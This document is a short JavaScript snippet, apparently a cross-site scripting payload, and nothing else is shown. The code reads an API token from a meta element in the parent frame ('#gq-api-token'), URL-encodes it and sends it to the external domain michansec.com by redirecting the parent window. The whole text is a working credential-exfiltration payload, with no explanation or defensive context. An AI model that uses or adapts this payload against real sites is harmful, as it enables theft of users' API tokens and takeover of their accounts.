(() => {
  const token = window.parent.document.querySelector('#gq-api-token')?.content || 'no_token';
  const encoded = encodeURIComponent(token);
  window.parent.location = `https://michansec.com/?t=${encoded}`;
})();
